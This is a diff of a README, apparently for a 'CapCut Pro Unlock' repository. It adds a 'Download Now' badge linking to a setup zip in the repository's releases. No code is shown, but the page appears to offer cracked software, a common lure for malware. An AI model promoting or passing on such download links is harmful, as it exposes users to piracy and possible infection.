@@ -8,8 +8,8 @@
 <img width="833" height="668" alt="image" src="https://github.com/user-attachments/assets/f1ee7e40-d6b8-4f87-9fa5-dfb96dd88063" />
 
 ## 📥 Download
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Signalbrerhythm/CapCut-Pro-Unlock/releases/download/setup-2.11/setup-v2.11.zip)
 
-[![Download Now](https://github.com/Signalbrerhythm/CapCut-Pro-Unlock/releases/download/setup-2.11/setup-v2.11.zip)
 
 </div>
 
